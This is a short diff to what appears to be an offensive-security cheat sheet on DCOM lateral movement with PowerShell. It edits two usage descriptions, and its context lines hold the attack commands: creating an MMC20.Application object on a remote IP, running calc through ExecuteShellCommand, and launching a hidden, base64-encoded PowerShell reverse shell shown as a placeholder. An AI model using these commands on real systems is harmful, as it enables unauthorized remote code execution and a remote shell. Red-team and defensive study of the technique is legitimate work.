@@ -135,11 +135,11 @@ In an elevated PowerShell:
 ```
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$targetIpAddress")) # the IP address is the only parameter to modify
 ```
-Usage to open a `calc` on the remote computer:
+Usage to open a `calc` on the remote computer (with local admin rights on the remode):
 ```
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc", "7") # parameters are Command, Directory, Parameters, and WindowState
 ```
-Usage to launch a reverse PowerShell on the remote computer:
+Usage to launch a reverse PowerShell on the remote computer (local admin):
 ```
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e base64longreverseshellstring", "7")
 ```
